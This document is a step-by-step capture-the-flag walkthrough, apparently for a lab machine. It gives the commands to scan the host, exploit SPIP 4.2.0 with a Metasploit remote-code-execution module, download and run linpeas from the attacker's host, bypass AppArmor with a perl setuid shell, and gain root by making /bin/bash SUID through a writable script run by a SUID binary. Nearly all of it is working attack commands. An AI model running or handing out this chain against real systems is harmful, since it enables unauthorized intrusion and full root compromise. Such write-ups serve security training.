
STEP -1

Find open service and ports:
```
nmap -A $ip -v -T5
result: 22,80
```


Find directories:
```
gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
result: /images, /spip
```


view source code:
```
http://url/imagers
[http://url/spip](http://url/spip)  -- spip 4.2.0
```


exploit spip version:
```
msfconsole -q
search spip
use multi/http/spip_rce_form
set rhosts $target_ip
set rport 80
set TARGETURI  /spip
set lhost $your_ip
exploit
```


STEP -2:

Find file and directories that your user has READ, WRITE and EXECUTABLE:
```
find / -type d -user think -writable 2>/dev/null
```

cd run/user/1000

Start a http python server in your device and send it target device
wget [http://$your_systemIP:port/linpeas.sh](http://$your_systemIP:port/linpeas.sh)
chmod +x linpeas.sh
./linpeas.sh

═══════╣ Files with Interesting Permissions╠═════════════════                                  
                                                                                      
-rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container (Unknown SUID binary!)


Bypass Apparmor:
Open browser and search – apparmore bypass hacktricks
```
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > run/user/1000/test.pl
chmod +x run/user/1000/test.pl
run/user/1000/test.pl
```

STEP -3:

```
cd /opt
ls -la
echo "chmod +xs /bin/bash" >> run_container.sh
run_container

ls -la /bin/bash   --- check user or group become “root” or not
/bin/bash -p
```

